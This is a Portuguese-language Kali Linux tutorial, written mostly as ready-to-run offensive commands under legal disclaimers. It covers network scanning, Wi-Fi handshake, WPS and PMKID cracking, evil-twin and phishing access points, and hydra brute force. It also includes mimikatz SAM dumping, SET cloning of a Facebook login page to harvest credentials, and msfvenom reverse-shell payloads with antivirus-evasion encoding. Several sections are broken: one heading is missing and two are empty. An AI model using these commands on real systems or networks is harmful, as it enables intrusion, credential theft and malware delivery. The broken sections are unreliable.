Introdução ao Kali Linux

O Kali Linux é uma distribuição baseada em Debian projetada para testes de penetração e auditoria de segurança. Desenvolvido pela Offensive Security, é a evolução do BackTrack Linux e traz mais de 600 ferramentas pré-instaladas para diversas tarefas de segurança.

AVISO DE RESPONSABILIDADE: Todas as técnicas e ferramentas descritas nesta página devem ser utilizadas APENAS em ambientes controlados, com autorização prévia e para fins educacionais ou de auditoria de segurança legítima. O uso indevido destas ferramentas pode constituir crime.

Características do Kali Linux 2025.2

  • Kernel: Linux 6.7
  • Interface: XFCE (padrão), GNOME, KDE, MATE e outras disponíveis
  • Arquiteturas suportadas: x64, x86, ARM
  • Completamente personalizável: Possibilidade de criar builds customizadas
  • Amplo suporte a hardware wireless: Compatível com a maioria dos adaptadores de rede
  • Multilíngue: Suporte a diversos idiomas
  • Ferramentas atualizadas: Repositórios sempre mantidos com as versões mais recentes

Instalação do Kali Linux

Existem várias formas de instalar e utilizar o Kali Linux. Vamos explorar as mais comuns e seus requisitos.

Requisitos de Sistema Recomendados

  • Processador: Intel i5 ou equivalente (ou superior)
  • RAM: Mínimo 4GB (8GB+ recomendado)
  • Armazenamento: 30GB de espaço em disco (SSD recomendado)
  • Placa de vídeo compatível com aceleração 3D (para algumas ferramentas)
  • Adaptador Wi-Fi compatível com modo monitor (para hacking wireless)

Métodos de Instalação

1. Instalação Completa (Dual Boot ou Único SO)

Este método instala o Kali Linux diretamente no hardware, seja como único sistema operacional ou ao lado de outros sistemas (dual boot).

1

Baixe a ISO oficial

Acesse https://www.kali.org/downloads/ e baixe a imagem ISO apropriada para seu hardware.

2

Crie um dispositivo bootável

Use ferramentas como Rufus (Windows), Etcher (multiplataforma) ou o comando dd (Linux) para criar um pendrive bootável.

# No Linux/Mac, use o comando dd (substitua /dev/sdX pelo dispositivo correto): sudo dd if=kali-linux-2025.2-installer-amd64.iso of=/dev/sdX bs=4M status=progress
3

Inicie o computador pelo dispositivo

Entre na BIOS/UEFI (geralmente pressionando F2, F12, DEL ou ESC durante a inicialização) e configure para iniciar pelo dispositivo USB.

4

Siga o assistente de instalação

Escolha idioma, local de instalação (para dual boot, selecione a partição correta) e configure usuário/senha.

Senha padrão para instalações novas: Username: kali / Password: kali

2. Máquina Virtual (VMware/VirtualBox)

Este é o método mais seguro e flexível para iniciantes, permitindo executar o Kali dentro de outro sistema operacional.

1

Baixe a imagem de VM pré-configurada

Acesse https://www.kali.org/get-kali/#kali-virtual-machines e baixe a imagem para VMware ou VirtualBox.

2

Instale o software de virtualização

Instale VMware Workstation/Player ou VirtualBox no seu sistema.

3

Importe a VM

No VMware: File > Open > Selecione o arquivo .vmx
No VirtualBox: Machine > Add > Selecione o arquivo .vbox

4

Configure os recursos da VM

Recomendado: 2+ CPU cores, 4GB+ RAM, 60GB+ de disco, configuração de rede em Bridge para testes de rede.

Observação: Para testes de Wi-Fi, você precisará de um adaptador USB externo compatível com modo monitor e configurar o USB passthrough na VM.

3. Kali Linux em dispositivos móveis (Nethunter)

O Kali NetHunter é a versão portátil do Kali Linux para dispositivos Android.

Opções de instalação:

  • NetHunter completo: Disponível para dispositivos específicos (principalmente OnePlus, Google Pixel e alguns Samsung)
  • NetHunter Lite: Versão mais leve, compatível com mais dispositivos
  • NetHunter Rootless: Versão que não requer root, com funcionalidade limitada

Confira a lista completa de dispositivos suportados e instruções em: https://www.kali.org/docs/nethunter/

Reconhecimento e Coleta de Informações

A fase de reconhecimento é fundamental em qualquer teste de penetração. O Kali Linux oferece diversas ferramentas para coletar informações sobre sistemas, redes e organizações.

ATENÇÃO: Realize estas atividades apenas em redes e sistemas com autorização explícita. A coleta não autorizada de informações pode violar leis de privacidade e segurança.

Descoberta de Hosts e Scan de Rede

Nmap

O Nmap (Network Mapper) é uma das ferramentas mais poderosas para descoberta de hosts, portas abertas e serviços em uma rede.

# Scan básico de um host nmap 192.168.1.1 # Scan rápido de uma rede nmap -F 192.168.1.0/24 # Scan detalhado com detecção de versão de serviços nmap -sV -sC -p- -T4 192.168.1.10 # Scan silencioso (stealth) nmap -sS -A -T2 192.168.1.10 # Scan com script NSE (Nmap Scripting Engine) nmap --script vuln 192.168.1.10 # Scan de rede com detecção de SO nmap -O -T4 192.168.1.0/24 # Scan de UDP nmap -sU -F 192.168.1.10

Opções comuns do Nmap:

  • -sS: SYN Scan (semi-stealth)
  • -sT: TCP Connect Scan
  • -sU: UDP Scan
  • -sV: Detecção de versão de serviços
  • -sC: Executa scripts padrão
  • -O: Detecção de sistema operacional
  • -p: Especifica portas (ex: -p 80,443 ou -p- para todas)
  • -A: Scan agressivo (OS + versão + scripts + traceroute)
  • -T(0-5): Velocidade do scan (0=lento, 5=rápido)
  • -oN, -oX, -oG: Salva resultados em formato Normal, XML ou Grepable

NetDiscover

Ferramenta para descoberta de hosts em uma rede local usando ARP.

# Scan passivo na interface padrão netdiscover -p # Scan ativo em uma rede específica netdiscover -r 192.168.1.0/24

Whois, DNS e Informações de Domínio

Whois

Obtém informações de registro de domínios e IPs.

whois exemplo.com.br whois 8.8.8.8

DNSrecon

Ferramenta avançada para reconhecimento de DNS.

# Enumeração básica de DNS dnsrecon -d exemplo.com.br # Tentativa de transferência de zona dnsrecon -d exemplo.com.br -t axfr # Bruteforce de subdomínios dnsrecon -d exemplo.com.br -D /usr/share/wordlists/dnsmap.txt -t brt

Dig

Ferramenta de consulta DNS.

# Consulta básica dig exemplo.com.br # Consulta de tipo específico dig mx exemplo.com.br dig txt exemplo.com.br # Consulta reversa dig -x 8.8.8.8

Reconhecimento Web

Gobuster

Ferramenta para bruteforce de diretórios e arquivos em servidores web.

# Bruteforce de diretórios gobuster dir -u http://exemplo.com.br -w /usr/share/wordlists/dirb/common.txt # Busca por extensões específicas gobuster dir -u http://exemplo.com.br -w /usr/share/wordlists/dirb/common.txt -x php,txt,html # Com agente de usuário personalizado gobuster dir -u http://exemplo.com.br -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"

Nikto

Scanner de vulnerabilidades web que detecta problemas comuns em servidores.

# Scan básico nikto -h http://exemplo.com.br # Scan com autenticação nikto -h http://exemplo.com.br -id admin:senha123 # Scan com saída em arquivo nikto -h http://exemplo.com.br -output relatorio.html -Format html

WPScan

Scanner específico para WordPress que identifica temas, plugins e vulnerabilidades.

# Scan básico wpscan --url http://exemplo.com.br # Enumeração de usuários wpscan --url http://exemplo.com.br --enumerate u # Scan completo wpscan --url http://exemplo.com.br --enumerate ap,t,tt,cb,dbe,u,m # Bruteforce de login wpscan --url http://exemplo.com.br --passwords /usr/share/wordlists/rockyou.txt --usernames admin

Hacking de Redes Wi-Fi

O Kali Linux é amplamente utilizado para auditoria de segurança em redes Wi-Fi. A seguir, veremos as principais ferramentas e técnicas para diferentes tipos de redes sem fio.

AVISO LEGAL: Invadir redes Wi-Fi sem autorização é crime. Utilize estes conhecimentos apenas em suas próprias redes ou com autorização explícita do proprietário para fins de teste de segurança.

Requisitos de Hardware

Para realizar testes em redes Wi-Fi, você precisará de um adaptador wireless que suporte o "modo monitor". Nem todos os adaptadores suportam este modo, que é necessário para capturar pacotes sem estar associado a uma rede.

Adaptadores Recomendados

  • Alfa AWUS036ACH (802.11ac, USB 3.0, chipset Realtek RTL8812AU)
  • Alfa AWUS036NHA (802.11n, chipset Atheros AR9271)
  • TP-Link TL-WN722N v1 (versões v2/v3 não são recomendadas)
  • Panda PAU09 (802.11n, chipset Ralink RT5372)

Preparação do Adaptador

1

Verificar interfaces disponíveis

iwconfig

Identifique sua interface wireless (geralmente wlan0, wlan1, etc.)

2

Ativar modo monitor

# Desativar interface ifconfig wlan0 down # Matar processos que possam interferir airmon-ng check kill # Ativar modo monitor airmon-ng start wlan0 # Alternativa manual iwconfig wlan0 mode monitor ifconfig wlan0 up

Após executar estes comandos, sua interface deve estar no modo monitor (geralmente renomeada para wlan0mon ou similar)

Escaneamento de Redes Wi-Fi

Usando Airodump-ng

# Escanear todas as redes disponíveis airodump-ng wlan0mon # Escanear em um canal específico airodump-ng wlan0mon --channel 6 # Escanear e salvar resultados airodump-ng wlan0mon -w captura

Usando Wash (para redes WPS)

# Buscar APs com WPS ativado wash -i wlan0mon

Ataques a Redes WEP

O protocolo WEP é considerado obsoleto e inseguro, mas ainda pode ser encontrado em alguns equipamentos antigos.

1

Capturar tráfego do AP alvo

airodump-ng wlan0mon -c [canal] --bssid [MAC_do_AP] -w wep_captura
2

Aumentar tráfego (ataque ARP replay)

aireplay-ng -3 -b [MAC_do_AP] -h [MAC_sua_placa] wlan0mon
3

Quebrar a chave

# Quando capturar IVs suficientes (10.000+) aircrack-ng wep_captura*.cap

Ataques a Redes WPA/WPA2

Ataque de Handshake

1

Capturar tráfego do AP alvo

airodump-ng wlan0mon -c [canal] --bssid [MAC_do_AP] -w wpa_captura
2

Desautenticar clientes para forçar reconnexão

# Desautenticar todos os clientes aireplay-ng -0 5 -a [MAC_do_AP] wlan0mon # Desautenticar um cliente específico aireplay-ng -0 5 -a [MAC_do_AP] -c [MAC_do_cliente] wlan0mon

O número 5 indica a quantidade de pacotes de desautenticação a serem enviados

3

Quebrar a senha com wordlist

# Após capturar o handshake (indicado no airodump-ng) aircrack-ng wpa_captura*.cap -w /usr/share/wordlists/rockyou.txt

Ataque WPS (PIN)

# Usando Reaver para bruteforce do PIN WPS reaver -i wlan0mon -b [MAC_do_AP] -vv # Com opção de timeout e ignorar lockout reaver -i wlan0mon -b [MAC_do_AP] -vv -t 5 -l 60 -d 2

Ataque PMKID

Este ataque não requer clientes conectados ao AP.

# Usando hcxdumptool para capturar PMKID hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status # Convertendo para formato hashcat hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng # Quebrando com hashcat hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -w 3

Criando Pontos de Acesso Falsos (Evil Twin)

Os ataques de Evil Twin criam uma rede Wi-Fi falsa que imita uma rede legítima para capturar credenciais ou realizar ataques man-in-the-middle.

Usando Airbase-ng

1

Criar AP falso

airbase-ng -e "Nome-da-Rede" -c 1 wlan0mon
2

Configurar interface at0 criada

ifconfig at0 up ifconfig at0 192.168.1.1 netmask 255.255.255.0
3

Configurar DHCP

# Criar arquivo de configuração para o dnsmasq echo "interface=at0 dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h dhcp-option=3,192.168.1.1 dhcp-option=6,192.168.1.1 server=8.8.8.8 log-queries log-dhcp" > /tmp/dnsmasq.conf # Iniciar servidor DHCP dnsmasq -C /tmp/dnsmasq.conf -d
4

Habilitar IP forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

Substitua eth0 pela interface com acesso à internet

Usando Wifiphisher

O Wifiphisher é uma ferramenta automatizada para criar APs falsos com páginas de phishing.

# Iniciar wifiphisher com interface única wifiphisher -i wlan0 -e "Free Wi-Fi" --force-hostapd # Com ataque de desautenticação wifiphisher -i wlan0 -d wlan1 -nJ -e "Rede-Alvo" -p firmware-upgrade

O Wifiphisher oferece várias páginas de phishing pré-configuradas, como atualizações de firmware, captive portal, etc.

Usando Fluxion

Fluxion automatiza o processo de criação de rede falsa e phishing para capturar senhas WPA/WPA2.

# Iniciar Fluxion (interface interativa) fluxion

Siga as instruções na interface para selecionar o alvo, capturar handshake e configurar o ataque.

Quebra de Senhas e Ataques de Força Bruta

O Kali Linux dispõe de diversas ferramentas para testes de força bruta, quebra de hashes e ataques de dicionário contra diferentes serviços e tipos de senhas.

Hashcat

Uma das ferramentas mais poderosas para quebra de hashes, com suporte a aceleração via GPU.

# Exemplo básico com hash MD5 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # Quebra de hash SHA256 hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # Ataque de regras hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule # Ataque de máscara (bruteforce) hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

Modos comuns do Hashcat (-m):

  • 0: MD5
  • 100: SHA1
  • 1000: NTLM
  • 1400: SHA256
  • 1800: SHA512
  • 2500: WPA/WPA2
  • 22000: WPA-PMKID-PBKDF2

Tipos de ataque (-a):

  • 0: Ataque de dicionário
  • 1: Ataque combinatório
  • 3: Ataque de máscara (bruteforce)
  • 6: Ataque híbrido (dicionário + máscara)
  • 7: Ataque híbrido (máscara + dicionário)

John the Ripper

Ferramenta versátil para quebra de senhas e hashes de diversos formatos.

# Formato automático john hash.txt # Com wordlist john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt # Especificando formato john --format=raw-md5 hash.txt # Modo incremental (bruteforce) john --incremental hash.txt # Mostrar senhas já quebradas john --show hash.txt

Hydra

Ferramenta para ataques de força bruta online contra diversos serviços e protocolos.

# Ataque FTP hydra -l usuario -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 # Ataque SSH hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 # Ataque HTTP POST (formulário de login) hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Falha no login" # Múltiplos usuários de uma lista hydra -L usuarios.txt -P senhas.txt 192.168.1.10 mysql

Wordlists

O Kali Linux vem com várias wordlists pré-instaladas, localizadas em /usr/share/wordlists/.

Principais Wordlists

  • rockyou.txt: Uma das maiores e mais populares (descompacte com gunzip /usr/share/wordlists/rockyou.txt.gz)
  • dirb/: Listas para bruteforce de diretórios web
  • metasploit/: Listas usadas pelo Metasploit
  • seclists/: Coleção de múltiplas listas para diversos propósitos (pode ser instalada com apt install seclists)

Criando Wordlists Personalizadas

Para testes mais eficientes, é recomendável criar wordlists específicas para o alvo.

Usando Crunch
# Gerar todas as combinações de 8 dígitos crunch 8 8 0123456789 -o senhas_8digitos.txt # Gerar senhas de 6 a 8 caracteres com letras e números crunch 6 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o senhas_alfanum.txt # Usar padrão (@: letras minúsculas, ,: letras maiúsculas, %: números) crunch 8 8 -t @@,,%%%% -o senhas_padrao.txt
Usando CeWL para criar wordlists baseadas em websites
# Extrair palavras de um site cewl https://exemplo.com.br -d 2 -m 5 -w palavras_site.txt # Com personalização cewl https://exemplo.com.br -d 3 -m 6 --with-numbers -w palavras_site.txt

Parâmetros: -d (profundidade), -m (tamanho mínimo da palavra)

Extração e Análise de Hashes

Extraindo hashes do Windows (SAM)

# Usando Mimikatz no Windows (pós-exploração) mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" # Usando Samdump2 no Linux (com arquivo SAM) samdump2 SYSTEM SAM > hashes_windows.txt

Extraindo hashes de arquivos protegidos

# PDF pdf2john arquivo.pdf > hash_pdf.txt # ZIP zip2john arquivo.zip > hash_zip.txt # RAR rar2john arquivo.rar > hash_rar.txt # Office office2john documento.docx > hash_office.txt

Engenharia Social

A engenharia social é frequentemente o vetor de ataque mais eficaz, pois explora o comportamento humano em vez de vulnerabilidades técnicas. O Kali Linux inclui ferramentas para auxiliar em campanhas de engenharia social.

SET (Social-Engineer Toolkit)

Framework abrangente para ataques de engenharia social.

# Iniciar o SET setoolkit

O SET oferece várias opções através de um menu interativo, incluindo:

  • Ataques de Phishing por E-mail: Envio de e-mails maliciosos personalizados
  • Ataques baseados na Web: Clonagem de sites para captura de credenciais
  • Geração de Payloads: Criação de executáveis maliciosos para diferentes plataformas
  • QRCode Attack: Geração de QR Codes maliciosos
  • Ataques Wireless: Pontos de acesso falsos com páginas de phishing

Clonando um site para phishing

1

No menu principal do SET, selecione:

  1. Social-Engineering Attacks
  2. Website Attack Vectors
  3. Credential Harvester Attack Method
  4. Site Cloner
2

Digite o IP do seu servidor (onde as credenciais serão enviadas)

3

Digite a URL do site a ser clonado (ex: https://facebook.com)

Framework para exploração de navegadores web, permitindo controlar navegadores comprometidos.

# Iniciar o BeEF beef-xss

Após iniciar, acesse o painel de controle em http://127.0.0.1:3000/ui/panel com as credenciais padrão (beef:beef).

  • XSS (Cross-Site Scripting)
  • Páginas de phishing
  • Ataques Man-in-the-Middle

GoPhish

Plataforma de phishing completa e open-source para campanhas de testes.

# Iniciar o GoPhish gophish

Após iniciar, acesse o painel administrativo em https://127.0.0.1:3333 com as credenciais padrão (admin:gophish).

O GoPhish permite:

  • Criar campanhas de phishing profissionais
  • Gerenciar grupos de destinatários
  • Criar modelos de e-mail personalizados
  • Clonar páginas de login
  • Rastrear aberturas de e-mail, cliques e envios de credenciais
  • Gerar relatórios detalhados

Metasploit Framework

O Metasploit Framework é uma das ferramentas mais poderosas e abrangentes para testes de penetração, oferecendo um arsenal completo para exploração, pós-exploração e desenvolvimento de exploits.

Componentes do Metasploit

  • Exploits: Códigos que aproveitam vulnerabilidades específicas
  • Payloads: Códigos que executam ações após exploração bem-sucedida
  • Auxiliares: Módulos para reconhecimento, scan, fuzzing, etc.
  • Encoders: Disfarçam payloads para evitar detecção
  • Post: Módulos para pós-exploração e coleta de informações
  • NOPs: Geradores de instruções NOP (No Operation) para técnicas de exploração
  • Evasion: Técnicas para evadir detecção de antivírus

Iniciando o Metasploit

Criando Payloads Autônomos

O Metasploit pode gerar executáveis standalone para diferentes plataformas:

# Windows Reverse Shell msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe # Linux Reverse Shell msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf # Android APK msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o malicious.apk # Payload Web (PHP) msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php # Macro para Microsoft Office msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f vba -o macro.txt # Bypass de antivírus com encoders msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

Forense Digital

O Kali Linux inclui várias ferramentas para análise forense digital, permitindo recuperar, analisar e documentar evidências digitais.

NOTA IMPORTANTE: Em análises forenses reais, sempre trabalhe com cópias (imagens) dos dados originais, nunca com o dispositivo original, para preservar evidências.

Aquisição de Imagens

DD

Ferramenta básica para criar imagens bit a bit de dispositivos.

# Criar imagem de um disco dd if=/dev/sdb of=imagem_disco.dd bs=4M status=progress # Criar imagem com hash simultaneamente dd if=/dev/sdb | tee imagem_disco.dd | sha256sum > imagem_disco.sha256

DCFLdd

Versão melhorada do dd com recursos adicionais para forense.

dcfldd if=/dev/sdb hash=sha256,md5 hashlog=imagem_hash.txt of=imagem_disco.dd bs=4M status=on

Autopsy/Sleuth Kit

Suite forense completa para análise de imagens de disco.

# Iniciar Autopsy autopsy

Testdisk e Photorec

Ferramentas para recuperação de partições e arquivos perdidos.

# Recuperar partições testdisk imagem_disco.dd # Recuperar arquivos photorec imagem_disco.dd

Foremost

Ferramenta para recuperação de arquivos baseada em cabeçalhos e footers.

foremost -i imagem_disco.dd -o recuperados

Análise de Memória

Volatility

Poderosa ferramenta para análise de dumps de memória RAM.

# Identificar perfil do sistema volatility -f memoria.dmp imageinfo # Listar processos volatility -f memoria.dmp --profile=Win10x64_19041 pslist # Extrair hashdump volatility -f memoria.dmp --profile=Win10x64_19041 hashdump # Analisar conexões de rede volatility -f memoria.dmp --profile=Win10x64_19041 netscan # Extrair comandos do CMD volatility -f memoria.dmp --profile=Win10x64_19041 cmdscan # Buscar por strings volatility -f memoria.dmp --profile=Win10x64_19041 yarascan -Y "senha|password"

Análise de Tráfego de Rede

Wireshark

Analisador de protocolos de rede com interface gráfica.

# Iniciar Wireshark wireshark # Analisar arquivo pcap wireshark captura.pcap

Filtros úteis do Wireshark:

  • http: Mostrar apenas tráfego HTTP
  • ip.addr == 192.168.1.10: Filtrar por IP
  • tcp.port == 80: Filtrar por porta
  • http.request.method == "POST": Apenas requisições POST
  • http contains "password": Buscar string nos pacotes

Tshark

Versão de linha de comando do Wireshark.

# Capturar tráfego tshark -i wlan0 -w captura.pcap # Filtrar captura existente tshark -r captura.pcap -Y "http" # Extrair credenciais HTTP tshark -r captura.pcap -Y "http.request.method == \"POST\"" -T fields -e http.file_data

Proxychains

Conclusão

O Kali Linux é uma ferramenta extremamente poderosa para profissionais de segurança da informação e hackers éticos. Com suas centenas de ferramentas pré-instaladas, oferece recursos completos para todas as fases de um teste de penetração, desde o reconhecimento inicial até a pós-exploração.

LEMBRETE IMPORTANTE: O conhecimento aqui apresentado deve ser utilizado apenas para fins éticos e legais, como:

  • Testes de penetração autorizados
  • Auditoria de segurança em sistemas próprios
  • Educação e pesquisa acadêmica
  • Competições CTF (Capture The Flag)

O uso destas ferramentas em sistemas sem autorização expressa constitui crime em praticamente todos os países.

Continue aprendendo, pratique em ambientes controlados como laboratórios virtuais e plataformas CTF, e use esse conhecimento para aumentar a segurança digital de forma ética e responsável.
